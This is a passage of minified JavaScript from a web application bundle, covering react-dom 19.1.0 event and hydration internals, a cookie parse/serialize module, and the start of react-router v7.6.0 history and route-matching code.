        if (c = c.memoizedState,
        c !== null && c.dehydrated !== null) {
            var d = c.retryLane;
            c.retryLane = d !== 0 && d < u ? d : u
        }
    }
    function xv(c, u) {
        iS(c, u),
        (c = c.alternate) && iS(c, u)
    }
    function sS(c) {
        if (c.tag === 13) {
            var u = $u(c, 67108864);
            u !== null && Xo(u, c, 67108864),
            xv(c, 67108864)
        }
    }
    var $g = !0;
    function r$(c, u, d, g) {
        var w = _.T;
        _.T = null;
        var A = $.p;
        try {
            $.p = 2,
            wv(c, u, d, g)
        } finally {
            $.p = A,
            _.T = w
        }
    }
    function n$(c, u, d, g) {
        var w = _.T;
        _.T = null;
        var A = $.p;
        try {
            $.p = 8,
            wv(c, u, d, g)
        } finally {
            $.p = A,
            _.T = w
        }
    }
    function wv(c, u, d, g) {
        if ($g) {
            var w = vv(g);
            if (w === null)
                av(c, u, g, zg, d),
                cS(c, g);
            else if (i$(w, c, u, d, g))
                g.stopPropagation();
            else if (cS(c, g),
            u & 4 && -1 < o$.indexOf(c)) {
                for (; w !== null; ) {
                    var A = Vt(w);
                    if (A !== null)
                        switch (A.tag) {
                        case 3:
                            if (A = A.stateNode,
                            A.current.memoizedState.isDehydrated) {
                                var q = Nt(A.pendingLanes);
                                if (q !== 0) {
                                    var Q = A;
                                    for (Q.pendingLanes |= 2,
                                    Q.entangledLanes |= 2; q; ) {
                                        var ce = 1 << 31 - U(q);
                                        Q.entanglements[1] |= ce,
                                        q &= ~ce
                                    }
                                    Es(A),
                                    (vr & 6) === 0 && (Pg = Cr() + 500,
                                    zh(0))
                                }
                            }
                            break;
                        case 13:
                            Q = $u(A, 2),
                            Q !== null && Xo(Q, A, 2),
                            Sg(),
                            xv(A, 2)
                        }
                    if (A = vv(g),
                    A === null && av(c, u, g, zg, d),
                    A === w)
                        break;
                    w = A
                }
                w !== null && g.stopPropagation()
            } else
                av(c, u, g, null, d)
        }
    }
    function vv(c) {
        return c = Cx(c),
        Tv(c)
    }
    var zg = null;
    function Tv(c) {
        if (zg = null,
        c = St(c),
        c !== null) {
            var u = n(c);
            if (u === null)
                c = null;
            else {
                var d = u.tag;
                if (d === 13) {
                    if (c = s(u),
                    c !== null)
                        return c;
                    c = null
                } else if (d === 3) {
                    if (u.stateNode.current.memoizedState.isDehydrated)
                        return u.tag === 3 ? u.stateNode.containerInfo : null;
                    c = null
                } else
                    u !== c && (c = null)
            }
        }
        return zg = c,
        null
    }
    function aS(c) {
        switch (c) {
        case "beforetoggle":
        case "cancel":
        case "click":
        case "close":
        case "contextmenu":
        case "copy":
        case "cut":
        case "auxclick":
        case "dblclick":
        case "dragend":
        case "dragstart":
        case "drop":
        case "focusin":
        case "focusout":
        case "input":
        case "invalid":
        case "keydown":
        case "keypress":
        case "keyup":
        case "mousedown":
        case "mouseup":
        case "paste":
        case "pause":
        case "play":
        case "pointercancel":
        case "pointerdown":
        case "pointerup":
        case "ratechange":
        case "reset":
        case "resize":
        case "seeked":
        case "submit":
        case "toggle":
        case "touchcancel":
        case "touchend":
        case "touchstart":
        case "volumechange":
        case "change":
        case "selectionchange":
        case "textInput":
        case "compositionstart":
        case "compositionend":
        case "compositionupdate":
        case "beforeblur":
        case "afterblur":
        case "beforeinput":
        case "blur":
        case "fullscreenchange":
        case "focus":
        case "hashchange":
        case "popstate":
        case "select":
        case "selectstart":
            return 2;
        case "drag":
        case "dragenter":
        case "dragexit":
        case "dragleave":
        case "dragover":
        case "mousemove":
        case "mouseout":
        case "mouseover":
        case "pointermove":
        case "pointerout":
        case "pointerover":
        case "scroll":
        case "touchmove":
        case "wheel":
        case "mouseenter":
        case "mouseleave":
        case "pointerenter":
        case "pointerleave":
            return 8;
        case "message":
            switch (se()) {
            case le:
                return 2;
            case Te:
                return 8;
            case Ue:
            case Re:
                return 32;
            case $e:
                return 268435456;
            default:
                return 32
            }
        default:
            return 32
        }
    }
    var Ev = !1
      , dc = null
      , hc = null
      , pc = null
      , Yh = new Map
      , Xh = new Map
      , gc = []
      , o$ = "mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset".split(" ");
    function cS(c, u) {
        switch (c) {
        case "focusin":
        case "focusout":
            dc = null;
            break;
        case "dragenter":
        case "dragleave":
            hc = null;
            break;
        case "mouseover":
        case "mouseout":
            pc = null;
            break;
        case "pointerover":
        case "pointerout":
            Yh.delete(u.pointerId);
            break;
        case "gotpointercapture":
        case "lostpointercapture":
            Xh.delete(u.pointerId)
        }
    }
    function Jh(c, u, d, g, w, A) {
        return c === null || c.nativeEvent !== A ? (c = {
            blockedOn: u,
            domEventName: d,
            eventSystemFlags: g,
            nativeEvent: A,
            targetContainers: [w]
        },
        u !== null && (u = Vt(u),
        u !== null && sS(u)),
        c) : (c.eventSystemFlags |= g,
        u = c.targetContainers,
        w !== null && u.indexOf(w) === -1 && u.push(w),
        c)
    }
    function i$(c, u, d, g, w) {
        switch (u) {
        case "focusin":
            return dc = Jh(dc, c, u, d, g, w),
            !0;
        case "dragenter":
            return hc = Jh(hc, c, u, d, g, w),
            !0;
        case "mouseover":
            return pc = Jh(pc, c, u, d, g, w),
            !0;
        case "pointerover":
            var A = w.pointerId;
            return Yh.set(A, Jh(Yh.get(A) || null, c, u, d, g, w)),
            !0;
        case "gotpointercapture":
            return A = w.pointerId,
            Xh.set(A, Jh(Xh.get(A) || null, c, u, d, g, w)),
            !0
        }
        return !1
    }
    function lS(c) {
        var u = St(c.target);
        if (u !== null) {
            var d = n(u);
            if (d !== null) {
                if (u = d.tag,
                u === 13) {
                    if (u = s(d),
                    u !== null) {
                        c.blockedOn = u,
                        ye(c.priority, function() {
                            if (d.tag === 13) {
                                var g = Yo();
                                g = bs(g);
                                var w = $u(d, g);
                                w !== null && Xo(w, d, g),
                                xv(d, g)
                            }
                        });
                        return
                    }
                } else if (u === 3 && d.stateNode.current.memoizedState.isDehydrated) {
                    c.blockedOn = d.tag === 3 ? d.stateNode.containerInfo : null;
                    return
                }
            }
        }
        c.blockedOn = null
    }
    function jg(c) {
        if (c.blockedOn !== null)
            return !1;
        for (var u = c.targetContainers; 0 < u.length; ) {
            var d = vv(c.nativeEvent);
            if (d === null) {
                d = c.nativeEvent;
                var g = new d.constructor(d.type,d);
                Px = g,
                d.target.dispatchEvent(g),
                Px = null
            } else
                return u = Vt(d),
                u !== null && sS(u),
                c.blockedOn = d,
                !1;
            u.shift()
        }
        return !0
    }
    function uS(c, u, d) {
        jg(c) && d.delete(u)
    }
    function s$() {
        Ev = !1,
        dc !== null && jg(dc) && (dc = null),
        hc !== null && jg(hc) && (hc = null),
        pc !== null && jg(pc) && (pc = null),
        Yh.forEach(uS),
        Xh.forEach(uS)
    }
    function qg(c, u) {
        c.blockedOn === u && (c.blockedOn = null,
        Ev || (Ev = !0,
        r.unstable_scheduleCallback(r.unstable_NormalPriority, s$)))
    }
    var Vg = null;
    function fS(c) {
        Vg !== c && (Vg = c,
        r.unstable_scheduleCallback(r.unstable_NormalPriority, function() {
            Vg === c && (Vg = null);
            for (var u = 0; u < c.length; u += 3) {
                var d = c[u]
                  , g = c[u + 1]
                  , w = c[u + 2];
                if (typeof g != "function") {
                    if (Tv(g || d) === null)
                        continue;
                    break
                }
                var A = Vt(d);
                A !== null && (c.splice(u, 3),
                u -= 3,
                Tw(A, {
                    pending: !0,
                    data: w,
                    method: d.method,
                    action: g
                }, g, w))
            }
        }))
    }
    function Qh(c) {
        function u(ce) {
            return qg(ce, c)
        }
        dc !== null && qg(dc, c),
        hc !== null && qg(hc, c),
        pc !== null && qg(pc, c),
        Yh.forEach(u),
        Xh.forEach(u);
        for (var d = 0; d < gc.length; d++) {
            var g = gc[d];
            g.blockedOn === c && (g.blockedOn = null)
        }
        for (; 0 < gc.length && (d = gc[0],
        d.blockedOn === null); )
            lS(d),
            d.blockedOn === null && gc.shift();
        if (d = (c.ownerDocument || c).$$reactFormReplay,
        d != null)
            for (g = 0; g < d.length; g += 3) {
                var w = d[g]
                  , A = d[g + 1]
                  , q = w[je] || null;
                if (typeof A == "function")
                    q || fS(d);
                else if (q) {
                    var Q = null;
                    if (A && A.hasAttribute("formAction")) {
                        if (w = A,
                        q = A[je] || null)
                            Q = q.formAction;
                        else if (Tv(w) !== null)
                            continue
                    } else
                        Q = q.action;
                    typeof Q == "function" ? d[g + 1] = Q : (d.splice(g, 3),
                    g -= 3),
                    fS(d)
                }
            }
    }
    function Av(c) {
        this._internalRoot = c
    }
    Hg.prototype.render = Av.prototype.render = function(c) {
        var u = this._internalRoot;
        if (u === null)
            throw Error(o(409));
        var d = u.current
          , g = Yo();
        oS(d, g, c, u, null, null)
    }
    ,
    Hg.prototype.unmount = Av.prototype.unmount = function() {
        var c = this._internalRoot;
        if (c !== null) {
            this._internalRoot = null;
            var u = c.containerInfo;
            oS(c.current, 2, null, c, null, null),
            Sg(),
            u[nt] = null
        }
    }
    ;
    function Hg(c) {
        this._internalRoot = c
    }
    Hg.prototype.unstable_scheduleHydration = function(c) {
        if (c) {
            var u = fe();
            c = {
                blockedOn: null,
                target: c,
                priority: u
            };
            for (var d = 0; d < gc.length && u !== 0 && u < gc[d].priority; d++)
                ;
            gc.splice(d, 0, c),
            d === 0 && lS(c)
        }
    }
    ;
    var dS = e.version;
    if (dS !== "19.1.0")
        throw Error(o(527, dS, "19.1.0"));
    $.findDOMNode = function(c) {
        var u = c._reactInternals;
        if (u === void 0)
            throw typeof c.render == "function" ? Error(o(188)) : (c = Object.keys(c).join(","),
            Error(o(268, c)));
        return c = l(u),
        c = c !== null ? f(c) : null,
        c = c === null ? null : c.stateNode,
        c
    }
    ;
    var a$ = {
        bundleType: 0,
        version: "19.1.0",
        rendererPackageName: "react-dom",
        currentDispatcherRef: _,
        reconcilerVersion: "19.1.0"
    };
    if (typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ < "u") {
        var Gg = __REACT_DEVTOOLS_GLOBAL_HOOK__;
        if (!Gg.isDisabled && Gg.supportsFiber)
            try {
                vt = Gg.inject(a$),
                Z = Gg
            } catch {}
    }
    return tp.createRoot = function(c, u) {
        if (!i(c))
            throw Error(o(299));
        var d = !1
          , g = ""
          , w = BC
          , A = _C
          , q = IC
          , Q = null;
        return u != null && (u.unstable_strictMode === !0 && (d = !0),
        u.identifierPrefix !== void 0 && (g = u.identifierPrefix),
        u.onUncaughtError !== void 0 && (w = u.onUncaughtError),
        u.onCaughtError !== void 0 && (A = u.onCaughtError),
        u.onRecoverableError !== void 0 && (q = u.onRecoverableError),
        u.unstable_transitionCallbacks !== void 0 && (Q = u.unstable_transitionCallbacks)),
        u = rS(c, 1, !1, null, null, d, g, w, A, q, Q, null),
        c[nt] = u.current,
        sv(c),
        new Av(u)
    }
    ,
    tp.hydrateRoot = function(c, u, d) {
        if (!i(c))
            throw Error(o(299));
        var g = !1
          , w = ""
          , A = BC
          , q = _C
          , Q = IC
          , ce = null
          , ve = null;
        return d != null && (d.unstable_strictMode === !0 && (g = !0),
        d.identifierPrefix !== void 0 && (w = d.identifierPrefix),
        d.onUncaughtError !== void 0 && (A = d.onUncaughtError),
        d.onCaughtError !== void 0 && (q = d.onCaughtError),
        d.onRecoverableError !== void 0 && (Q = d.onRecoverableError),
        d.unstable_transitionCallbacks !== void 0 && (ce = d.unstable_transitionCallbacks),
        d.formState !== void 0 && (ve = d.formState)),
        u = rS(c, 1, !0, u, d ?? null, g, w, A, q, Q, ce, ve),
        u.context = nS(null),
        d = u.current,
        g = Yo(),
        g = bs(g),
        w = Ja(g),
        w.callback = null,
        Qa(d, w, g),
        d = g,
        u.current.lanes = d,
        oo(u, d),
        Es(u),
        c[nt] = u.current,
        sv(c),
        new Hg(u)
    }
    ,
    tp.version = "19.1.0",
    tp
}
var ES;
function w$() {
    if (ES)
        return Bv.exports;
    ES = 1;
    function r() {
        if (!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ > "u" || typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE != "function"))
            try {
                __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(r)
            } catch (e) {
                console.error(e)
            }
    }
    return r(),
    Bv.exports = x$(),
    Bv.exports
}
var v$ = w$()
  , ue = jA();
const Ir = Zc(ue)
  , ZW = f$({
    __proto__: null,
    default: Ir
}, [ue]);
var rp = {}, AS;
function T$() {
    if (AS)
        return rp;
    AS = 1,
    Object.defineProperty(rp, "__esModule", {
        value: !0
    }),
    rp.parse = s,
    rp.serialize = f;
    const r = /^[\u0021-\u003A\u003C\u003E-\u007E]+$/
      , e = /^[\u0021-\u003A\u003C-\u007E]*$/
      , t = /^([.]?[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?)([.][a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?)*$/i
      , o = /^[\u0020-\u003A\u003D-\u007E]*$/
      , i = Object.prototype.toString
      , n = ( () => {
        const b = function() {};
        return b.prototype = Object.create(null),
        b
    }
    )();
    function s(b, v) {
        const T = new n
          , x = b.length;
        if (x < 2)
            return T;
        const E = (v == null ? void 0 : v.decode) || h;
        let B = 0;
        do {
            const P = b.indexOf("=", B);
            if (P === -1)
                break;
            const O = b.indexOf(";", B)
              , F = O === -1 ? x : O;
            if (P > F) {
                B = b.lastIndexOf(";", P - 1) + 1;
                continue
            }
            const D = a(b, B, P)
              , I = l(b, P, D)
              , M = b.slice(D, I);
            if (T[M] === void 0) {
                let C = a(b, P + 1, F)
                  , W = l(b, F, C);
                const k = E(b.slice(C, W));
                T[M] = k
            }
            B = F + 1
        } while (B < x);
        return T
    }
    function a(b, v, T) {
        do {
            const x = b.charCodeAt(v);
            if (x !== 32 && x !== 9)
                return v
        } while (++v < T);
        return T
    }
    function l(b, v, T) {
        for (; v > T; ) {
            const x = b.charCodeAt(--v);
            if (x !== 32 && x !== 9)
                return v + 1
        }
        return T
    }
    function f(b, v, T) {
        const x = (T == null ? void 0 : T.encode) || encodeURIComponent;
        if (!r.test(b))
            throw new TypeError(`argument name is invalid: ${b}`);
        const E = x(v);
        if (!e.test(E))
            throw new TypeError(`argument val is invalid: ${v}`);
        let B = b + "=" + E;
        if (!T)
            return B;
        if (T.maxAge !== void 0) {
            if (!Number.isInteger(T.maxAge))
                throw new TypeError(`option maxAge is invalid: ${T.maxAge}`);
            B += "; Max-Age=" + T.maxAge
        }
        if (T.domain) {
            if (!t.test(T.domain))
                throw new TypeError(`option domain is invalid: ${T.domain}`);
            B += "; Domain=" + T.domain
        }
        if (T.path) {
            if (!o.test(T.path))
                throw new TypeError(`option path is invalid: ${T.path}`);
            B += "; Path=" + T.path
        }
        if (T.expires) {
            if (!p(T.expires) || !Number.isFinite(T.expires.valueOf()))
                throw new TypeError(`option expires is invalid: ${T.expires}`);
            B += "; Expires=" + T.expires.toUTCString()
        }
        if (T.httpOnly && (B += "; HttpOnly"),
        T.secure && (B += "; Secure"),
        T.partitioned && (B += "; Partitioned"),
        T.priority)
            switch (typeof T.priority == "string" ? T.priority.toLowerCase() : void 0) {
            case "low":
                B += "; Priority=Low";
                break;
            case "medium":
                B += "; Priority=Medium";
                break;
            case "high":
                B += "; Priority=High";
                break;
            default:
                throw new TypeError(`option priority is invalid: ${T.priority}`)
            }
        if (T.sameSite)
            switch (typeof T.sameSite == "string" ? T.sameSite.toLowerCase() : T.sameSite) {
            case !0:
            case "strict":
                B += "; SameSite=Strict";
                break;
            case "lax":
                B += "; SameSite=Lax";
                break;
            case "none":
                B += "; SameSite=None";
                break;
            default:
                throw new TypeError(`option sameSite is invalid: ${T.sameSite}`)
            }
        return B
    }
    function h(b) {
        if (b.indexOf("%") === -1)
            return b;
        try {
            return decodeURIComponent(b)
        } catch {
            return b
        }
    }
    function p(b) {
        return i.call(b) === "[object Date]"
    }
    return rp
}
T$();
/**
 * react-router v7.6.0
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */
var YW = r => {
    throw TypeError(r)
}
  , E$ = (r, e, t) => e.has(r) || YW("Cannot " + t)
  , Wv = (r, e, t) => (E$(r, e, "read from private field"),
t ? t.call(r) : e.get(r))
  , A$ = (r, e, t) => e.has(r) ? YW("Cannot add the same private member more than once") : e instanceof WeakSet ? e.add(r) : e.set(r, t)
  , PS = "popstate";
function P$(r={}) {
    function e(o, i) {
        let {pathname: n, search: s, hash: a} = o.location;
        return Up("", {
            pathname: n,
            search: s,
            hash: a
        }, i.state && i.state.usr || null, i.state && i.state.key || "default")
    }
    function t(o, i) {
        return typeof i == "string" ? i : jc(i)
    }
    return S$(e, t, null, r)
}
function er(r, e) {
    if (r === !1 || r === null || typeof r > "u")
        throw new Error(e)
}
function fn(r, e) {
    if (!r) {
        typeof console < "u" && console.warn(e);
        try {
            throw new Error(e)
        } catch {}
    }
}
function C$() {
    return Math.random().toString(36).substring(2, 10)
}
function CS(r, e) {
    return {
        usr: r.state,
        key: r.key,
        idx: e
    }
}
function Up(r, e, t=null, o) {
    return {
        pathname: typeof r == "string" ? r : r.pathname,
        search: "",
        hash: "",
        ...typeof e == "string" ? Yc(e) : e,
        state: t,
        key: e && e.key || o || C$()
    }
}
function jc({pathname: r="/", search: e="", hash: t=""}) {
    return e && e !== "?" && (r += e.charAt(0) === "?" ? e : "?" + e),
    t && t !== "#" && (r += t.charAt(0) === "#" ? t : "#" + t),
    r
}
function Yc(r) {
    let e = {};
    if (r) {
        let t = r.indexOf("#");
        t >= 0 && (e.hash = r.substring(t),
        r = r.substring(0, t));
        let o = r.indexOf("?");
        o >= 0 && (e.search = r.substring(o),
        r = r.substring(0, o)),
        r && (e.pathname = r)
    }
    return e
}
function S$(r, e, t, o={}) {
    let {window: i=document.defaultView, v5Compat: n=!1} = o
      , s = i.history
      , a = "POP"
      , l = null
      , f = h();
    f == null && (f = 0,
    s.replaceState({
        ...s.state,
        idx: f
    }, ""));
    function h() {
        return (s.state || {
            idx: null
        }).idx
    }
    function p() {
        a = "POP";
        let E = h()
          , B = E == null ? null : E - f;
        f = E,
        l && l({
            action: a,
            location: x.location,
            delta: B
        })
    }
    function b(E, B) {
        a = "PUSH";
        let P = Up(x.location, E, B);
        f = h() + 1;
        let O = CS(P, f)
          , F = x.createHref(P);
        try {
            s.pushState(O, "", F)
        } catch (D) {
            if (D instanceof DOMException && D.name === "DataCloneError")
                throw D;
            i.location.assign(F)
        }
        n && l && l({
            action: a,
            location: x.location,
            delta: 1
        })
    }
    function v(E, B) {
        a = "REPLACE";
        let P = Up(x.location, E, B);
        f = h();
        let O = CS(P, f)
          , F = x.createHref(P);
        s.replaceState(O, "", F),
        n && l && l({
            action: a,
            location: x.location,
            delta: 0
        })
    }
    function T(E) {
        return XW(E)
    }
    let x = {
        get action() {
            return a
        },
        get location() {
            return r(i, s)
        },
        listen(E) {
            if (l)
                throw new Error("A history only accepts one active listener");
            return i.addEventListener(PS, p),
            l = E,
            () => {
                i.removeEventListener(PS, p),
                l = null
            }
        },
        createHref(E) {
            return e(i, E)
        },
        createURL: T,
        encodeLocation(E) {
            let B = T(E);
            return {
                pathname: B.pathname,
                search: B.search,
                hash: B.hash
            }
        },
        push: b,
        replace: v,
        go(E) {
            return s.go(E)
        }
    };
    return x
}
function XW(r, e=!1) {
    let t = "http://localhost";
    typeof window < "u" && (t = window.location.origin !== "null" ? window.location.origin : window.location.href),
    er(t, "No window.location.(origin|href) available to create URL");
    let o = typeof r == "string" ? r : jc(r);
    return o = o.replace(/ $/, "%20"),
    !e && o.startsWith("//") && (o = t + o),
    new URL(o,t)
}
var Pp, SS = class {
    constructor(r) {
        if (A$(this, Pp, new Map),
        r)
            for (let[e,t] of r)
                this.set(e, t)
    }
    get(r) {
        if (Wv(this, Pp).has(r))
            return Wv(this, Pp).get(r);
        if (r.defaultValue !== void 0)
            return r.defaultValue;
        throw new Error("No value found for context")
    }
    set(r, e) {
        Wv(this, Pp).set(r, e)
    }
}
;
Pp = new WeakMap;
var B$ = new Set(["lazy", "caseSensitive", "path", "id", "index", "children"]);
function _$(r) {
    return B$.has(r)
}
var I$ = new Set(["lazy", "caseSensitive", "path", "id", "index", "unstable_middleware", "children"]);
function O$(r) {
    return I$.has(r)
}
function R$(r) {
    return r.index === !0
}
function zm(r, e, t=[], o={}) {
    return r.map( (i, n) => {
        let s = [...t, String(n)]
          , a = typeof i.id == "string" ? i.id : s.join("-");
        if (er(i.index !== !0 || !i.children, "Cannot specify children on an index route"),
        er(!o[a], `Found a route id collision on id "${a}".  Route id's must be globally unique within Data Router usages`),
        R$(i)) {
            let l = {
                ...i,
                ...e(i),
                id: a
            };
            return o[a] = l,
            l
        } else {
            let l = {
                ...i,
                ...e(i),
                id: a,
                children: void 0
            };
            return o[a] = l,
            i.children && (l.children = zm(i.children, e, s, o)),
            l
        }
    }
    )
}
function Mc(r, e, t="/") {
    return pm(r, e, t, !1)
}
function pm(r, e, t, o) {
    let i = typeof e == "string" ? Yc(e) : e
      , n = Li(i.pathname || "/", t);
    if (n == null)
        return null;
    let s = JW(r);
    M$(s);
    let a = null;
    for (let l = 0; a == null && l < s.length; ++l) {
        let f = V$(n);
        a = j$(s[l], f, o)
    }
    return a
}
function W$(r, e) {
    let {route: t, pathname: o, params: i} = r;
    return {
        id: t.id,
        pathname: o,
        params: i,
        data: e[t.id],
        handle: t.handle
    }
}
function JW(r, e=[], t=[], o="") {
    let i = (n, s, a) => {
        let l = {
            relativePath: a === void 0 ? n.path || "" : a,
            caseSensitive: n.caseSensitive === !0,
            childrenIndex: s,
            route: n
        };
        l.relativePath.startsWith("/") && (er(l.relativePath.startsWith(o), `Absolute route path "${l.relativePath}" nested under path "${o}" is not valid. An absolute child route path must start with the combined path of all its parent routes.`),
        l.relativePath = l.relativePath.slice(o.length));
        let f = Hs([o, l.relativePath])
          , h = t.concat(l);
        n.children && n.children.length > 0 && (er(n.index !== !0, `Index routes must not have child routes. Please remove all child routes from route path "${f}".`),
        JW(n.children, e, h, f)),
        !(n.path == null && !n.index) && e.push({
            path: f,
            score: $$(f, n.index),
            routesMeta: h
        })
    }
    ;
    return r.forEach( (n, s) => {
        var a;
        if (n.path === "" || !((a = n.path) != null && a.includes("?")))
            i(n, s);
        else
            for (let l of QW(n.path))
                i(n, s, l)
    }
    ),
    e
}
function QW(r) {
    let e = r.split("/");
    if (e.length === 0)
        return [];
    let[t,...o] = e
      , i = t.endsWith("?")
      , n = t.replace(/\?$/, "");
    if (o.length === 0)
        return i ? [n, ""] : [n];
    let s = QW(o.join("/"))
      , a = [];
    return a.push(...s.map(l => l === "" ? n : [n, l].join("/"))),
    i && a.push(...s),
    a.map(l => r.startsWith("/") && l === "" ? "/" : l)
}
function M$(r) {
    r.sort( (e, t) => e.score !== t.score ? t.score - e.score : z$(e.routesMeta.map(o => o.childrenIndex), t.routesMeta.map(o => o.childrenIndex)))
}
var N$ = /^:[\w-]+$/
  , D$ = 3
  , F$ = 2
  , U$ = 1
  , k$ = 10
  , L$ = -2
  , BS = r => r === "*";
function $$(r, e) {
    let t = r.split("/")
      , o = t.length;
    return t.some(BS) && (o += L$),
    e && (o += F$),
    t.filter(i => !BS(i)).reduce( (i, n) => i + (N$.test(n) ? D$ : n === "" ? U$ : k$), o)
}
function z$(r, e) {
    return r.length === e.length && r.slice(0, -1).every( (o, i) => o === e[i]) ? r[r.length - 1] - e[e.length - 1] : 0
}
function j$(r, e, t=!1) {
    let {routesMeta: o} = r
      , i = {}
      , n = "/"
      , s = [];
    for (let a = 0; a < o.length; ++a) {
        let l = o[a]
          , f = a === o.length - 1
          , h = n === "/" ? e : e.slice(n.length) || "/"
          , p = jm({
            path: l.relativePath,
            caseSensitive: l.caseSensitive,
            end: f
        }, h)
          , b = l.route;
        if (!p && f && t && !o[o.length - 1].route.index && (p = jm({
            path: l.relativePath,
            caseSensitive: l.caseSensitive,
            end: !1
        }, h)),
        !p)
            return null;
        Object.assign(i, p.params),
        s.push({
            params: i,
            pathname: Hs([n, p.pathname]),
            pathnameBase: K$(Hs([n, p.pathnameBase])),
            route: b
        }),
        p.pathnameBase !== "/" && (n = Hs([n, p.pathnameBase]))
    }
    return s
}
function jm(r, e) {
    typeof r == "string" && (r = {
        path: r,
        caseSensitive: !1,
        end: !0
    });
    let[t,o] = q$(r.path, r.caseSensitive, r.end)
      , i = e.match(t);
    if (!i)
        return null;
    let n = i[0]
      , s = n.replace(/(.)\/+$/, "$1")
      , a = i.slice(1);
    return {
        params: o.reduce( (f, {paramName: h, isOptional: p}, b) => {
            if (h === "*") {
                let T = a[b] || "";
                s = n.slice(0, n.length - T.length).replace(/(.)\/+$/, "$1")
            }
            const v = a[b];
            return p && !v ? f[h] = void 0 : f[h] = (v || "").replace(/%2F/g, "/"),
            f
        }
        , {}),
        pathname: n,
        pathnameBase: s,
        pattern: r
    }
}
function q$(r, e=!1, t=!0) {
    fn(r === "*" || !r.endsWith("*") || r.endsWith("/*"), `Route path "${r}" will be treated as if it were "${r.replace(/\*$/, "/*")}" because the \`*\` character must always follow a \`/\` in the pattern. To get rid of this warning, please change the route path to "${r.replace(/\*$/, "/*")}".`);
    let o = []
      , i = "^" + r.replace(/\/*\*?$/, "").replace(/^\/*/, "/").replace(/[\\.*+^${}|()[\]]/g, "\\$&").replace(/\/:([\w-]+)(\?)?/g, (s, a, l) => (o.push({
        paramName: a,
        isOptional: l != null
    }),
    l ? "/?([^\\/]+)?" : "/([^\\/]+)"));
    return r.endsWith("*") ? (o.push({
        paramName: "*"
    }),
    i += r === "*" || r === "/*" ? "(.*)$" : "(?:\\/(.+)|\\/*)$") : t ? i += "\\/*$" : r !== "" && r !== "/" && (i += "(?:(?=\\/|$))"),
    [new RegExp(i,e ? void 0 : "i"), o]
}
function V$(r) {
    try {
        return r.split("/").map(e => decodeURIComponent(e).replace(/\//g, "%2F")).join("/")
    } catch (e) {
        return fn(!1, `The URL path "${r}" could not be decoded because it is a malformed URL segment. This is probably due to a bad percent encoding (${e}).`),
        r
    }
}
function Li(r, e) {
    if (e === "/")
        return r;
    if (!r.toLowerCase().startsWith(e.toLowerCase()))
        return null;
    let t = e.endsWith("/") ? e.length - 1 : e.length
      , o = r.charAt(t);
    return o && o !== "/" ? null : r.slice(t) || "/"
}
function H$(r, e="/") {
    let {pathname: t, search: o="", hash: i=""} = typeof r == "string" ? Yc(r) : r;
    return {
        pathname: t ? t.startsWith("/") ? t : G$(t, e) : e,
        search: Z$(o),
        hash: Y$(i)
    }
}
function G$(r, e) {
    let t = e.replace(/\/+$/, "").split("/");
    return r.split("/").forEach(i => {
        i === ".." ? t.length > 1 && t.pop() : i !== "." && t.push(i)
    }
    ),
    t.length > 1 ? t.join("/") : "/"
}
function Mv(r, e, t, o) {
    return `Cannot include a '${r}' character in a manually specified \`to.${e}\` field [${JSON.stringify(o)}].  Please separate it out to the \`to.${t}\` field. Alternatively you may provide the full path as a string in <Link to="..."> and the router will parse it for you.`
}
function e9(r) {
    return r.filter( (e, t) => t === 0 || e.route.path && e.route.path.length > 0)
}
function qA(r) {
    let e = e9(r);
    return e.map( (t, o) => o === e.length - 1 ? t.pathname : t.pathnameBase)
}
function VA(r, e, t, o=!1) {
    let i;
    typeof r == "string" ? i = Yc(r) : (i = {
        ...r
    },
    er(!i.pathname || !i.pathname.includes("?"), Mv("?", "pathname", "search", i)),
    er(!i.pathname || !i.pathname.includes("#"), Mv("#", "pathname", "hash", i)),
    er(!i.search || !i.search.includes("#"), Mv("#", "search", "hash", i)));
    let n = r === "" || i.pathname === "", s = n ? "/" : i.pathname, a;
    if (s == null)
        a = t;
    else {
        let p = e.length - 1;
        if (!o && s.startsWith("..")) {
            let b = s.split("/");
            for (; b[0] === ".."; )
                b.shift(),
                p -= 1;
            i.pathname = b.join("/")
        }
        a = p >= 0 ? e[p] : "/"
    }
    let l = H$(i, a)
      , f = s && s !== "/" && s.endsWith("/")
      , h = (n || s === ".") && t.endsWith("/");
    return !l.pathname.endsWith("/") && (f || h) && (l.pathname += "/"),
    l
}
var Hs = r => r.join("/").replace(/\/\/+/g, "/")
  , K$ = r => r.replace(/\/+$/, "").replace(/^\/*/, "/")
  , Z$ = r => !r || r === "?" ? "" : r.startsWith("?") ? r : "?" + r
  , Y$ = r => !r || r === "#" ? "" : r.startsWith("#") ? r : "#" + r
  , qm = class {
    constructor(r, e, t, o=!1) {
        this.status = r,
        this.statusText = e || "",
        this.internal = o,
        t instanceof Error ? (this.data = t.toString(),
        this.error = t) : this.data = t
    }
}
;
function kp(r) {
    return r != null && typeof r.status == "number" && typeof r.statusText == "string" && typeof r.internal == "boolean" && "data"in r
}
var t9 = ["POST", "PUT", "PATCH", "DELETE"]
  , X$ = new Set(t9)
  , J$ = ["GET", ...t9]
  , Q$ = new Set(J$)
  , ez = new Set([301, 302, 303, 307, 308])
  , tz = new Set([307, 308])
  , Nv = {
    state: "idle",
    location: void 0,
    formMethod: void 0,
    formAction: void 0,
    formEncType: void 0,
    formData: void 0,
    json: void 0,
    text: void 0
}
  , rz = {
    state: "idle",
    data: void 0,
    formMethod: void 0,
    formAction: void 0,
    formEncType: void 0,
    formData: void 0,
    json: void 0,
    text: void 0
}
  , np = {
    state: "unblocked",
    proceed: void 0,
    reset: void 0,
    location: void 0
}
  , HA = /^(?:[a-z][a-z0-9+.-]*:|\/\/)/i
  , nz = r => ({
    hasErrorBoundary: !!r.hasErrorBoundary
})
  , r9 = "remix-router-transitions"
  , n9 = Symbol("ResetLoaderData");
function oz(r) {
    const e = r.window ? r.window : typeof window < "u" ? window : void 0
      , t = typeof e < "u" && typeof e.document < "u" && typeof e.document.createElement < "u";
